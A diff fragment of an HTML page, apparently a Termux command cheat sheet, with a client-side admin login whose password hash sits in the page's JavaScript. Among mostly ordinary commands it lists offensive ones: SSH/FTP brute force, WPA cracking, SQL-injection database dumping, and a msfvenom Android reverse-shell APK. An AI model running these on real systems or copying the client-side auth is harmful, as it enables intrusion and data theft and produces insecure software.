+      <svg width="15" height="15" fill="currentColor" viewBox="0 0 24 24"><path d="M12 0C5.37 0 0 5.37 0 12c0 5.3 3.438 9.8 8.205 11.385.6.113.82-.258.82-.577 0-.285-.01-1.04-.015-2.04-3.338.724-4.042-1.61-4.042-1.61C4.422 18.07 3.633 17.7 3.633 17.7c-1.087-.744.084-.729.084-.729 1.205.084 1.838 1.236 1.838 1.236 1.07 1.835 2.809 1.305 3.495.998.108-.776.417-1.305.76-1.605-2.665-.3-5.466-1.332-5.466-5.93 0-1.31.465-2.38 1.235-3.22-.135-.303-.54-1.523.105-3.176 0 0 1.005-.322 3.3 1.23.96-.267 1.98-.399 3-.405 1.02.006 2.04.138 3 .405 2.28-1.552 3.285-1.23 3.285-1.23.645 1.653.24 2.873.12 3.176.765.84 1.23 1.91 1.23 3.22 0 4.61-2.805 5.625-5.475 5.92.42.36.81 1.096.81 2.22 0 1.606-.015 2.896-.015 3.286 0 .315.21.69.825.57C20.565 21.795 24 17.295 24 12c0-6.63-5.37-12-12-12"/></svg>
+      GitHub @Forhadj
+    </a>
+    <a href="https://www.facebook.com/forhad99555" target="_blank" rel="noopener" class="footer-link">
+      <svg width="15" height="15" fill="currentColor" viewBox="0 0 24 24"><path d="M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.47h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.47h-2.796v8.385C19.612 23.027 24 18.062 24 12.073z"/></svg>
+      Facebook
+    </a>
+  </div>
+  <div class="footer-copy">© 2024 TermuxKit · Developed by FORHAD Hassan · Free Forever</div>
+</footer>
+
+<button class="btt" id="btt" onclick="scrollTo({top:0,behavior:'smooth'})">↑</button>
+<div class="toast" id="toast"></div>
+
+<script>
+// ============================================================
+// ✅ SECURITY: Password stored as SHA-256 hash ONLY
+// Plain text password is NEVER stored in this file.
+// To change password:
+//   1. Hash your new password at https://emn178.github.io/online-tools/sha256.html
+//   2. Replace the ADMIN_HASH value below
+// Current password hint: ask the developer
+// ============================================================
+const ADMIN_HASH = 'ab0c1f823d3aafff999b10bd675e34c2994340c1f207e8c92d84bec51800e1c7';
+
+// ✅ SECURITY: Brute-force protection state
+let loginAttempts = 0;
+const MAX_ATTEMPTS = 3;
+const LOCKOUT_MS = 60000; // 60 seconds
+let lockoutUntil = 0;
+
+// ✅ SECURITY: Session timeout (30 minutes)
+const SESSION_TIMEOUT_MS = 30 * 60 * 1000;
+let sessionExpiry = 0;
+let sessionTimerInterval = null;
+
+// ✅ SHA-256 via Web Crypto API (no external library needed)
+async function sha256(message) {
+  const msgBuffer = new TextEncoder().encode(message);
+  const hashBuffer = await crypto.subtle.digest('SHA-256', msgBuffer);
+  const hashArray = Array.from(new Uint8Array(hashBuffer));
+  return hashArray.map(b => b.toString(16).padStart(2, '0')).join('');
+}
+
+const CATS={
+  'Setup & Config':   {icon:'⚙️', color:'#00ff88'},
+  'Package Manager':  {icon:'📦', color:'#38bdf8'},
+  'Termux API':       {icon:'📱', color:'#a78bfa'},
+  'Python':           {icon:'🐍', color:'#fbbf24'},
+  'Node.js / npm':    {icon:'🟢', color:'#83cd29'},
+  'Web & Network':    {icon:'🌐', color:'#f87171'},
+  'File System':      {icon:'📁', color:'#c084fc'},
+  'System Info':      {icon:'💻', color:'#fb923c'},
+  'Process Control':  {icon:'⚡', color:'#f472b6'},
+  'Text Editors':     {icon:'✏️', color:'#22d3ee'},
+  'Git & GitHub':     {icon:'🔀', color:'#f78166'},
+  'SSH & Remote':     {icon:'🔑', color:'#4ade80'},
+  'Security Tools':   {icon:'🔐', color:'#f87171'},
+  'Recon & Scanning': {icon:'🔍', color:'#fb7185'},
+  'Password Tools':   {icon:'🗝️', color:'#fb923c'},
+  'Web Hacking':      {icon:'🕷️', color:'#e879f9'},
+  'Metasploit':       {icon:'💣', color:'#94a3b8'},
+  'Scripting':        {icon:'📜', color:'#818cf8'},
+  'Servers':          {icon:'🖥️', color:'#2dd4bf'},
+  'Database':         {icon:'🗄️', color:'#fcd34d'},
+  'Compression':      {icon:'🗜️', color:'#7dd3fc'},
+  'Crypto & Hash':    {icon:'🔒', color:'#34d399'},
+  'Text Processing':  {icon:'📝', color:'#a3e635'},
+  'Fun & Extras':     {icon:'🎉', color:'#fcd34d'},
+};
+
+// Base command data (read-only source of truth)
+const BASE_DATA=[
+  {c:'termux-setup-storage',d:'Grant storage permission (run once on fresh install)',e:'Required for file access',cat:'Setup & Config'},
+  {c:'pkg update',d:'Update package lists',e:'Run before installing anything',cat:'Setup & Config'},
+  {c:'pkg upgrade',d:'Upgrade all installed packages',e:'pkg update && pkg upgrade',cat:'Setup & Config'},
+  {c:'termux-change-repo',d:'Change mirror repository for faster downloads',e:'Select a faster mirror for your region',cat:'Setup & Config'},
+  {c:'pkg install termux-api',d:'Install Termux:API addon for device features',e:'Needed for camera, SMS, location etc.',cat:'Setup & Config'},
+  {c:'pkg install termux-tools',d:'Install core Termux utilities',e:'',cat:'Setup & Config'},
+  {c:'termux-info',d:'Show Termux system information',e:'',cat:'Setup & Config'},
+  {c:'source ~/.bashrc',d:'Reload bash config without restarting',e:'',cat:'Setup & Config'},
+  {c:'nano ~/.bashrc',d:'Edit bash configuration file',e:'',cat:'Setup & Config'},
+  {c:'echo "export EDITOR=nano" >> ~/.bashrc',d:'Set default editor permanently',e:'',cat:'Setup & Config'},
+  {c:'pkg install zsh',d:'Install Zsh shell',e:'',cat:'Setup & Config'},
+  {c:'chsh -s zsh',d:'Switch to Zsh as default shell',e:'',cat:'Setup & Config'},
+  {c:'pkg install oh-my-zsh',d:'Install Oh My Zsh framework',e:'',cat:'Setup & Config'},
+  {c:'pkg install <name>',d:'Install a package',e:'pkg install python',cat:'Package Manager'},
+  {c:'pkg uninstall <name>',d:'Remove a package',e:'pkg uninstall nano',cat:'Package Manager'},
+  {c:'pkg reinstall <name>',d:'Reinstall a package',e:'',cat:'Package Manager'},
+  {c:'pkg list-installed',d:'List all installed packages',e:'',cat:'Package Manager'},
+  {c:'pkg list-all',d:'List all available packages',e:'',cat:'Package Manager'},
+  {c:'pkg search <query>',d:'Search for a package',e:'pkg search nmap',cat:'Package Manager'},
+  {c:'pkg show <name>',d:'Show package information and details',e:'pkg show python',cat:'Package Manager'},
+  {c:'pkg files <name>',d:'Show files installed by a package',e:'',cat:'Package Manager'},
+  {c:'apt list --installed',d:'List installed packages via apt',e:'',cat:'Package Manager'},
+  {c:'apt-get autoremove',d:'Remove unused dependencies',e:'',cat:'Package Manager'},
+  {c:'dpkg -l',d:'List all dpkg packages',e:'',cat:'Package Manager'},
+  {c:'pkg install python nodejs git curl wget',d:'Install multiple packages at once',e:'',cat:'Package Manager'},
+  {c:'pkg install clang cmake make',d:'Install C/C++ build tools',e:'',cat:'Package Manager'},
+  {c:'pkg install ffmpeg',d:'Install FFmpeg media processing tool',e:'Video/audio manipulation',cat:'Package Manager'},
+  {c:'pkg install tor torsocks',d:'Install Tor anonymity network',e:'Route traffic through Tor',cat:'Package Manager'},
+  {c:'pkg install proxychains-ng',d:'Route tools through proxy chains',e:'',cat:'Package Manager'},
+  {c:'pkg install nmap',d:'Install Nmap network scanner',e:'',cat:'Package Manager'},
+  {c:'pkg install hydra',d:'Install Hydra login brute-forcer',e:'',cat:'Package Manager'},
+  {c:'pkg install john',d:'Install John the Ripper password cracker',e:'',cat:'Package Manager'},
+  {c:'pkg install hashcat',d:'Install Hashcat GPU hash cracker',e:'',cat:'Package Manager'},
+  {c:'pkg install sqlmap',d:'Install SQLMap SQL injection tool',e:'',cat:'Package Manager'},
+  {c:'pkg install nikto',d:'Install Nikto web server scanner',e:'',cat:'Package Manager'},
+  {c:'pkg install metasploit',d:'Install Metasploit Framework',e:'Large download ~800MB',cat:'Package Manager'},
+  {c:'pkg install aircrack-ng',d:'Install Wi-Fi security suite',e:'Requires rooted device',cat:'Package Manager'},
+  {c:'pkg install tcpdump',d:'Install packet capture tool',e:'',cat:'Package Manager'},
+  {c:'pkg install openssh',d:'Install SSH server and client',e:'',cat:'Package Manager'},
+  {c:'pkg install git ruby golang php perl',d:'Install programming languages',e:'',cat:'Package Manager'},
+  {c:'pkg install sqlite mariadb',d:'Install SQLite and MariaDB databases',e:'',cat:'Package Manager'},
+  {c:'pkg install tmux htop neofetch',d:'Install useful system tools',e:'',cat:'Package Manager'},
+  {c:'termux-battery-status',d:'Show device battery percentage and status',e:'Requires termux-api',cat:'Termux API'},
+  {c:'termux-brightness 100',d:'Set screen brightness (0-255)',e:'',cat:'Termux API'},
+  {c:'termux-clipboard-get',d:'Get current clipboard content',e:'',cat:'Termux API'},
+  {c:'termux-clipboard-set "text"',d:'Copy text to clipboard',e:'',cat:'Termux API'},
+  {c:'termux-notification --title "T" --content "B"',d:'Send system notification',e:'',cat:'Termux API'},
+  {c:'termux-vibrate -d 500',d:'Vibrate device for 500ms',e:'-d duration in milliseconds',cat:'Termux API'},
+  {c:'termux-location',d:'Get device GPS location data',e:'Requires location permission',cat:'Termux API'},
+  {c:'termux-open-url <url>',d:'Open URL in default browser',e:'',cat:'Termux API'},
+  {c:'termux-share <file>',d:'Share file with other apps',e:'',cat:'Termux API'},
+  {c:'termux-camera-photo photo.jpg',d:'Take a photo with device camera',e:'',cat:'Termux API'},
+  {c:'termux-torch --on',d:'Turn on device flashlight',e:'--off to turn off',cat:'Termux API'},
+  {c:'termux-tts-speak "Hello World"',d:'Convert text to speech audio',e:'',cat:'Termux API'},
+  {c:'termux-sms-list',d:'List SMS messages from inbox',e:'Requires READ_SMS permission',cat:'Termux API'},
+  {c:'termux-wake-lock',d:'Prevent device from going to sleep',e:'termux-wake-unlock to release',cat:'Termux API'},
+  {c:'termux-open <file>',d:'Open file with default app',e:'',cat:'Termux API'},
+  {c:'termux-toast "Hello"',d:'Show a brief toast notification',e:'',cat:'Termux API'},
+  {c:'python --version',d:'Check installed Python version',e:'',cat:'Python'},
+  {c:'python3 script.py',d:'Run a Python script',e:'',cat:'Python'},
+  {c:'python -m venv env',d:'Create a virtual environment',e:'',cat:'Python'},
+  {c:'source env/bin/activate',d:'Activate virtual environment',e:'',cat:'Python'},
+  {c:'deactivate',d:'Deactivate current virtual environment',e:'',cat:'Python'},
+  {c:'pip install <package>',d:'Install a Python package',e:'pip install requests',cat:'Python'},
+  {c:'pip install -r requirements.txt',d:'Install all packages from requirements file',e:'',cat:'Python'},
+  {c:'pip list',d:'List all installed pip packages',e:'',cat:'Python'},
+  {c:'pip show <package>',d:'Show details about a pip package',e:'',cat:'Python'},
+  {c:'pip uninstall <package>',d:'Remove a pip package',e:'',cat:'Python'},
+  {c:'pip install requests',d:'HTTP library for API calls',e:'import requests',cat:'Python'},
+  {c:'pip install scapy',d:'Network packet manipulation library',e:'Used for network analysis',cat:'Python'},
+  {c:'pip install flask',d:'Lightweight web framework',e:'',cat:'Python'},
+  {c:'pip install django',d:'Full-stack web framework',e:'',cat:'Python'},
+  {c:'pip install fastapi uvicorn',d:'Modern async web framework',e:'',cat:'Python'},
+  {c:'pip install paramiko',d:'SSH automation library',e:'SSH scripting',cat:'Python'},
+  {c:'pip install pwntools',d:'CTF and exploit development library',e:'',cat:'Python'},
+  {c:'pip install impacket',d:'Network protocol library for attacks',e:'SMB, Kerberos etc.',cat:'Python'},
+  {c:'pip install beautifulsoup4',d:'HTML/XML parser for web scraping',e:'from bs4 import BeautifulSoup',cat:'Python'},
+  {c:'pip install selenium',d:'Browser automation framework',e:'',cat:'Python'},
+  {c:'pip install scrapy',d:'Web scraping framework',e:'',cat:'Python'},
+  {c:'pip install cryptography pycryptodome',d:'Cryptography libraries',e:'',cat:'Python'},
+  {c:'pip install numpy pandas matplotlib',d:'Data science and visualization libraries',e:'',cat:'Python'},
+  {c:'python -m http.server 8080',d:'Start HTTP server on port 8080',e:'Serves current directory',cat:'Python'},
+  {c:'node --version',d:'Check installed Node.js version',e:'',cat:'Node.js / npm'},
+  {c:'npm --version',d:'Check installed npm version',e:'',cat:'Node.js / npm'},
+  {c:'node script.js',d:'Run a Node.js script file',e:'',cat:'Node.js / npm'},
+  {c:'npm init -y',d:'Initialize new npm project with defaults',e:'Creates package.json',cat:'Node.js / npm'},
+  {c:'npm install <package>',d:'Install npm package locally',e:'npm install express',cat:'Node.js / npm'},
+  {c:'npm install -g <package>',d:'Install package globally',e:'npm install -g nodemon',cat:'Node.js / npm'},
+  {c:'npm install',d:'Install all dependencies from package.json',e:'',cat:'Node.js / npm'},
+  {c:'npm uninstall <package>',d:'Remove a package',e:'',cat:'Node.js / npm'},
+  {c:'npm list',d:'List all installed packages',e:'',cat:'Node.js / npm'},
+  {c:'npm run <script>',d:'Run a script defined in package.json',e:'npm run start',cat:'Node.js / npm'},
+  {c:'npm start',d:'Run the default start script',e:'',cat:'Node.js / npm'},
+  {c:'npm test',d:'Run the test script',e:'',cat:'Node.js / npm'},
+  {c:'npm install express axios nodemon socket.io',d:'Install popular Node.js packages',e:'',cat:'Node.js / npm'},
+  {c:'npx create-react-app my-app',d:'Create a new React application',e:'',cat:'Node.js / npm'},
+  {c:'curl <url>',d:'Fetch URL content',e:'curl https://example.com',cat:'Web & Network'},
+  {c:'curl -I <url>',d:'Fetch HTTP headers only',e:'',cat:'Web & Network'},
+  {c:'curl -X POST -d "data" <url>',d:'Send HTTP POST request',e:'',cat:'Web & Network'},
+  {c:'curl -H "Authorization: Bearer TOKEN" <url>',d:'Send request with auth header',e:'',cat:'Web & Network'},
+  {c:'curl -o file.html <url>',d:'Save URL output to file',e:'',cat:'Web & Network'},
+  {c:'curl ifconfig.me',d:'Get your public IP address',e:'',cat:'Web & Network'},
+  {c:'curl ipinfo.io/ip',d:'Get IP via ipinfo.io',e:'',cat:'Web & Network'},
+  {c:'wget <url>',d:'Download file from URL',e:'',cat:'Web & Network'},
+  {c:'wget -r <url>',d:'Recursively download entire website',e:'',cat:'Web & Network'},
+  {c:'wget -c <url>',d:'Resume an incomplete download',e:'',cat:'Web & Network'},
+  {c:'ping -c 4 <host>',d:'Ping host 4 times to check connectivity',e:'ping -c 4 google.com',cat:'Web & Network'},
+  {c:'traceroute <host>',d:'Trace network route to host',e:'',cat:'Web & Network'},
+  {c:'netstat -tuln',d:'Show open ports and listening services',e:'',cat:'Web & Network'},
+  {c:'ss -tuln',d:'Modern faster replacement for netstat',e:'',cat:'Web & Network'},
+  {c:'ifconfig',d:'Show network interface configuration',e:'pkg install net-tools first',cat:'Web & Network'},
+  {c:'ip addr',d:'Show all IP addresses',e:'',cat:'Web & Network'},
+  {c:'ip route',d:'Display routing table',e:'',cat:'Web & Network'},
+  {c:'dig <domain>',d:'DNS lookup for domain',e:'dig google.com',cat:'Web & Network'},
+  {c:'dig <domain> MX',d:'Get MX (mail) DNS records',e:'',cat:'Web & Network'},
+  {c:'dig <domain> ANY',d:'Get all DNS records for domain',e:'',cat:'Web & Network'},
+  {c:'nslookup <domain>',d:'Simple DNS query tool',e:'',cat:'Web & Network'},
+  {c:'whois <domain>',d:'WHOIS domain registration info',e:'',cat:'Web & Network'},
+  {c:'arp -a',d:'Show ARP table of local network devices',e:'',cat:'Web & Network'},
+  {c:'tcpdump -i any',d:'Capture all network packets',e:'Ctrl+C to stop',cat:'Web & Network'},
+  {c:'tcpdump -i wlan0 -w cap.pcap',d:'Save packet capture to file',e:'',cat:'Web & Network'},
+  {c:'torsocks curl ifconfig.me',d:'Check your IP through Tor network',e:'pkg install tor torsocks',cat:'Web & Network'},
+  {c:'proxychains <cmd>',d:'Run command through configured proxy chains',e:'Edit /etc/proxychains.conf',cat:'Web & Network'},
+  {c:'ls',d:'List directory contents',e:'',cat:'File System'},
+  {c:'ls -la',d:'List all files with details including hidden',e:'',cat:'File System'},
+  {c:'ls -lh',d:'List files with human-readable sizes',e:'',cat:'File System'},
+  {c:'ls -lt',d:'List files sorted by modification time',e:'',cat:'File System'},
+  {c:'pwd',d:'Print current working directory path',e:'',cat:'File System'},
+  {c:'cd <dir>',d:'Change to specified directory',e:'cd /sdcard/Download',cat:'File System'},
+  {c:'cd ~',d:'Navigate to home directory',e:'',cat:'File System'},
+  {c:'cd ..',d:'Go up one directory level',e:'',cat:'File System'},
+  {c:'cd -',d:'Return to previous directory',e:'',cat:'File System'},
+  {c:'mkdir <dir>',d:'Create a new directory',e:'mkdir my-project',cat:'File System'},
+  {c:'mkdir -p a/b/c',d:'Create nested directories at once',e:'',cat:'File System'},
+  {c:'touch <file>',d:'Create an empty file',e:'touch index.html',cat:'File System'},
+  {c:'cp <src> <dst>',d:'Copy a file',e:'cp file.txt backup.txt',cat:'File System'},
+  {c:'cp -r <dir> <dst>',d:'Copy directory recursively',e:'',cat:'File System'},
+  {c:'mv <src> <dst>',d:'Move or rename a file',e:'mv old.txt new.txt',cat:'File System'},
+  {c:'rm <file>',d:'Delete a file',e:'',cat:'File System'},
+  {c:'rm -rf <dir>',d:'Force delete directory and all contents',e:'⚠️ No undo! Be careful',cat:'File System'},
+  {c:'rmdir <dir>',d:'Remove empty directory',e:'',cat:'File System'},
+  {c:'find / -name "*.txt"',d:'Find all .txt files from root',e:'',cat:'File System'},
+  {c:'find . -type f -size +1M',d:'Find files larger than 1MB',e:'',cat:'File System'},
+  {c:'find . -mtime -7',d:'Find files modified in last 7 days',e:'',cat:'File System'},
+  {c:'cat <file>',d:'Display file contents',e:'',cat:'File System'},
+  {c:'cat file1 file2 > merged.txt',d:'Merge two files into one',e:'',cat:'File System'},
+  {c:'head -n 20 <file>',d:'Show first 20 lines of file',e:'',cat:'File System'},
+  {c:'tail -n 20 <file>',d:'Show last 20 lines of file',e:'',cat:'File System'},
+  {c:'tail -f <file>',d:'Follow file changes in real-time',e:'Live log monitoring',cat:'File System'},
+  {c:'less <file>',d:'Paginate through file (q to quit)',e:'',cat:'File System'},
+  {c:'more <file>',d:'Page through file (basic pager)',e:'',cat:'File System'},
+  {c:'wc -l <file>',d:'Count total lines in file',e:'',cat:'File System'},
+  {c:'chmod +x <file>',d:'Make file executable',e:'',cat:'File System'},
+  {c:'chmod 755 <file>',d:'Set file permissions to 755',e:'',cat:'File System'},
+  {c:'chown user:group <file>',d:'Change file owner and group',e:'',cat:'File System'},
+  {c:'zip -r archive.zip folder/',d:'Create zip archive from folder',e:'',cat:'File System'},
+  {c:'unzip archive.zip',d:'Extract zip archive',e:'-d /dest for target folder',cat:'File System'},
+  {c:'tar -xzf file.tar.gz',d:'Extract tar.gz archive',e:'',cat:'File System'},
+  {c:'tar -czf out.tar.gz folder/',d:'Create gzip-compressed tar archive',e:'',cat:'File System'},
+  {c:'whoami',d:'Display current username',e:'',cat:'System Info'},
+  {c:'id',d:'Show user ID and group memberships',e:'',cat:'System Info'},
+  {c:'uname -a',d:'Show all system information',e:'',cat:'System Info'},
+  {c:'uname -r',d:'Show running kernel version',e:'',cat:'System Info'},
+  {c:'df -h',d:'Show disk space usage in human-readable format',e:'',cat:'System Info'},
+  {c:'du -sh <dir>',d:'Show total size of a directory',e:'',cat:'System Info'},
+  {c:'free -h',d:'Show RAM and swap memory usage',e:'',cat:'System Info'},
+  {c:'uptime',d:'Show system uptime and load average',e:'',cat:'System Info'},
+  {c:'date',d:'Show current date and time',e:'',cat:'System Info'},
+  {c:'cal',d:'Display a calendar',e:'cal 2025 for full year view',cat:'System Info'},
+  {c:'env',d:'Show all environment variables',e:'',cat:'System Info'},
+  {c:'echo $PATH',d:'Show the PATH environment variable',e:'',cat:'System Info'},
+  {c:'export VAR=value',d:'Set an environment variable',e:'export PORT=3000',cat:'System Info'},
+  {c:'neofetch',d:'Show fancy system info banner',e:'pkg install neofetch',cat:'System Info'},
+  {c:'ps',d:'Show running processes',e:'',cat:'Process Control'},
+  {c:'ps aux',d:'Show all processes with CPU and memory details',e:'',cat:'Process Control'},
+  {c:'top',d:'Monitor processes in real-time',e:'q to quit',cat:'Process Control'},
+  {c:'htop',d:'Interactive colorful process viewer',e:'pkg install htop',cat:'Process Control'},
+  {c:'kill <pid>',d:'Send terminate signal to process by PID',e:'',cat:'Process Control'},
+  {c:'kill -9 <pid>',d:'Force kill a process immediately',e:'Get PID from ps aux',cat:'Process Control'},
+  {c:'pkill <name>',d:'Kill process by name',e:'pkill python3',cat:'Process Control'},
+  {c:'bg',d:'Resume a stopped job in background',e:'',cat:'Process Control'},
+  {c:'fg',d:'Bring background job to foreground',e:'',cat:'Process Control'},
+  {c:'nohup <cmd> &',d:'Run command that survives shell logout',e:'',cat:'Process Control'},
+  {c:'<cmd> &',d:'Run command in background',e:'python server.py &',cat:'Process Control'},
+  {c:'jobs',d:'List all background and suspended jobs',e:'',cat:'Process Control'},
+  {c:'history',d:'Show previously entered commands',e:'',cat:'Process Control'},
+  {c:'clear',d:'Clear the terminal screen',e:'',cat:'Process Control'},
+  {c:'exit',d:'Exit terminal session',e:'',cat:'Process Control'},
+  {c:'nano <file>',d:'Open Nano editor (beginner friendly)',e:'Ctrl+X to exit',cat:'Text Editors'},
+  {c:'vim <file>',d:'Open Vim editor (powerful and fast)',e:':q! to force quit',cat:'Text Editors'},
+  {c:'vi <file>',d:'Open classic Vi editor',e:'',cat:'Text Editors'},
+  {c:'micro <file>',d:'Open modern terminal text editor',e:'pkg install micro',cat:'Text Editors'},
+  {c:'emacs <file>',d:'Open GNU Emacs editor',e:'pkg install emacs',cat:'Text Editors'},
+  {c:'vim +/<search> <file>',d:'Open Vim and jump to search pattern',e:'',cat:'Text Editors'},
+  {c:'git init',d:'Initialize new git repository',e:'',cat:'Git & GitHub'},
+  {c:'git clone <url>',d:'Clone a remote repository locally',e:'',cat:'Git & GitHub'},
+  {c:'git status',d:'Show working tree status',e:'',cat:'Git & GitHub'},
+  {c:'git add .',d:'Stage all modified files',e:'git add file.txt for single file',cat:'Git & GitHub'},
+  {c:'git commit -m "message"',d:'Commit staged changes with message',e:'',cat:'Git & GitHub'},
+  {c:'git push origin main',d:'Push commits to GitHub main branch',e:'',cat:'Git & GitHub'},
+  {c:'git pull',d:'Fetch and merge remote changes',e:'',cat:'Git & GitHub'},
+  {c:'git log --oneline',d:'Show compact commit history',e:'',cat:'Git & GitHub'},
+  {c:'git branch',d:'List all local branches',e:'',cat:'Git & GitHub'},
+  {c:'git checkout -b <branch>',d:'Create and switch to new branch',e:'',cat:'Git & GitHub'},
+  {c:'git merge <branch>',d:'Merge specified branch into current',e:'',cat:'Git & GitHub'},
+  {c:'git stash',d:'Temporarily save uncommitted changes',e:'git stash pop to restore',cat:'Git & GitHub'},
+  {c:'git reset --hard HEAD',d:'Discard all local uncommitted changes',e:'⚠️ Irreversible',cat:'Git & GitHub'},
+  {c:'git diff',d:'Show unstaged file differences',e:'',cat:'Git & GitHub'},
+  {c:'git remote -v',d:'Show remote repository URLs',e:'',cat:'Git & GitHub'},
+  {c:'git tag v1.0',d:'Create a version tag on current commit',e:'',cat:'Git & GitHub'},
+  {c:'git config --global user.name "Name"',d:'Set global git username',e:'',cat:'Git & GitHub'},
+  {c:'git config --global user.email "email"',d:'Set global git email address',e:'',cat:'Git & GitHub'},
+  {c:'ssh user@host',d:'Connect to remote server via SSH',e:'ssh root@192.168.1.1',cat:'SSH & Remote'},
+  {c:'ssh -p 2222 user@host',d:'SSH connection on custom port',e:'',cat:'SSH & Remote'},
+  {c:'ssh-keygen',d:'Generate RSA/ED25519 SSH key pair',e:'',cat:'SSH & Remote'},
+  {c:'ssh-copy-id user@host',d:'Copy public key to remote server',e:'Enables passwordless login',cat:'SSH & Remote'},
+  {c:'scp file.txt user@host:/path',d:'Securely copy file to remote server',e:'',cat:'SSH & Remote'},
+  {c:'scp -r folder user@host:/path',d:'Securely copy folder to remote server',e:'',cat:'SSH & Remote'},
+  {c:'sshd',d:'Start SSH daemon on Termux (port 8022)',e:'Connect from PC: ssh -p 8022 ...',cat:'SSH & Remote'},
+  {c:'sftp user@host',d:'Start interactive SFTP session',e:'File transfer interface',cat:'SSH & Remote'},
+  {c:'ssh -L 8080:localhost:80 user@host',d:'Local port forwarding tunnel',e:'',cat:'SSH & Remote'},
+  {c:'ssh -R 80:localhost:8080 user@host',d:'Reverse port forwarding tunnel',e:'',cat:'SSH & Remote'},
+  {c:'tmux',d:'Start terminal multiplexer session',e:'Ctrl+B then D to detach',cat:'SSH & Remote'},
+  {c:'tmux attach',d:'Reattach to existing tmux session',e:'',cat:'SSH & Remote'},
+  {c:'nmap -sV <target>',d:'Detect running service versions',e:'Authorized targets only',cat:'Security Tools'},
+  {c:'nmap -A <target>',d:'Aggressive scan: OS + version + scripts',e:'',cat:'Security Tools'},
+  {c:'nmap -p 1-1000 <ip>',d:'Scan ports 1 through 1000',e:'',cat:'Security Tools'},
+  {c:'nmap -sn 192.168.1.0/24',d:'Ping scan to discover live hosts in subnet',e:'',cat:'Security Tools'},
+  {c:'nmap --script vuln <host>',d:'Run NSE vulnerability detection scripts',e:'',cat:'Security Tools'},
+  {c:'airmon-ng start wlan0',d:'Enable monitor mode on wireless interface',e:'Requires root + compatible chip',cat:'Security Tools'},
+  {c:'airodump-ng wlan0mon',d:'Capture wireless network packets',e:'',cat:'Security Tools'},
+  {c:'aircrack-ng -w wordlist cap.pcap',d:'Crack WPA/WEP from capture file',e:'Own networks only',cat:'Security Tools'},
+  {c:'tcpdump -i wlan0 -n',d:'Capture and display packets on wlan0',e:'',cat:'Security Tools'},
+  {c:'openssl s_client -connect host:443',d:'Test SSL/TLS connection to server',e:'',cat:'Security Tools'},
+  {c:'openssl x509 -in cert.pem -text',d:'Read and display SSL certificate details',e:'',cat:'Security Tools'},
+  {c:'whois <domain>',d:'Get domain registration and owner info',e:'',cat:'Recon & Scanning'},
+  {c:'dig <domain> ANY',d:'Get all DNS record types for domain',e:'',cat:'Recon & Scanning'},
+  {c:'host <domain>',d:'Simple DNS lookup tool',e:'',cat:'Recon & Scanning'},
+  {c:'theHarvester -d <domain> -b all',d:'Harvest emails and subdomains',e:'pip install theHarvester',cat:'Recon & Scanning'},
+  {c:'subfinder -d <domain>',d:'Passive subdomain enumeration tool',e:'',cat:'Recon & Scanning'},
+  {c:'nikto -h <target>',d:'Scan web server for common vulnerabilities',e:'Own servers only',cat:'Recon & Scanning'},
+  {c:'gobuster dir -u <url> -w wordlist',d:'Web directory and file brute force enumeration',e:'',cat:'Recon & Scanning'},
+  {c:'dirb http://target /wordlist',d:'Web content scanner using word lists',e:'pkg install dirb',cat:'Recon & Scanning'},
+  {c:'hydra -l admin -P pass.txt ssh://<ip>',d:'SSH brute force login attack',e:'Authorized systems only',cat:'Password Tools'},
+  {c:'hydra -L users.txt -P pass.txt ftp://<ip>',d:'FTP brute force with user/pass lists',e:'',cat:'Password Tools'},
+  {c:'john --wordlist=rockyou.txt hash.txt',d:'Crack password hashes with John the Ripper',e:'',cat:'Password Tools'},
+  {c:'john --show hash.txt',d:'Display cracked passwords from John',e:'',cat:'Password Tools'},
+  {c:'hashcat -m 0 hash.txt wordlist',d:'Crack MD5 hashes with Hashcat',e:'-m 0 = MD5 mode',cat:'Password Tools'},
+  {c:'hashcat -m 1800 hash.txt wordlist',d:'Crack SHA-512crypt hashes',e:'',cat:'Password Tools'},
+  {c:'hashid hash.txt',d:'Identify the type of a hash',e:'pip install hashid',cat:'Password Tools'},
+  {c:'crunch 8 8 abc123 -o wordlist.txt',d:'Generate custom wordlist with crunch',e:'pkg install crunch',cat:'Password Tools'},
+  {c:'cupp -i',d:'Generate targeted wordlist from personal info',e:'pip install cupp',cat:'Password Tools'},
+  {c:'sqlmap -u "http://site/?id=1"',d:'Test URL for SQL injection vulnerabilities',e:'Own sites only',cat:'Web Hacking'},
+  {c:'sqlmap -u <url> --dbs',d:'Enumerate available databases via SQLi',e:'',cat:'Web Hacking'},
+  {c:'sqlmap -u <url> --dump',d:'Dump database contents via SQLi',e:'',cat:'Web Hacking'},
+  {c:'wpscan --url <url>',d:'Scan WordPress site for vulnerabilities',e:'gem install wpscan',cat:'Web Hacking'},
+  {c:'wafw00f <url>',d:'Detect Web Application Firewalls (WAF)',e:'pip install wafw00f',cat:'Web Hacking'},
+  {c:'whatweb <url>',d:'Identify web technologies used on a site',e:'gem install whatweb',cat:'Web Hacking'},
+  {c:'xsser -u "http://site/?p=1"',d:'Test for Cross-Site Scripting (XSS)',e:'',cat:'Web Hacking'},
+  {c:'msfconsole',d:'Start Metasploit Framework interactive console',e:'pkg install metasploit',cat:'Metasploit'},
+  {c:'search <exploit>',d:'Search for exploit modules in database',e:'search eternalblue',cat:'Metasploit'},
+  {c:'use <module>',d:'Select a Metasploit module to load',e:'use exploit/multi/handler',cat:'Metasploit'},
+  {c:'show options',d:'Display required and optional module settings',e:'',cat:'Metasploit'},
+  {c:'set RHOST <ip>',d:'Set target remote host IP address',e:'',cat:'Metasploit'},
+  {c:'set LHOST <ip>',d:'Set local host IP (your machine)',e:'',cat:'Metasploit'},
+  {c:'set PAYLOAD <payload>',d:'Select exploit payload to use',e:'',cat:'Metasploit'},
+  {c:'run',d:'Execute the loaded module and payload',e:'Also: exploit',cat:'Metasploit'},
+  {c:'msfvenom -p android/meterpreter/reverse_tcp LHOST=<ip> -o app.apk',d:'Generate Android Meterpreter APK',e:'Educational / own devices only',cat:'Metasploit'},
+  {c:'sessions -l',d:'List all active Meterpreter sessions',e:'',cat:'Metasploit'},
+  {c:'sessions -i <id>',d:'Interact with a specific session',e:'',cat:'Metasploit'},
+  {c:'db_nmap -sV <target>',d:'Run Nmap from Metasploit and store results',e:'',cat:'Metasploit'},
+  {c:'bash script.sh',d:'Execute a bash shell script',e:'',cat:'Scripting'},
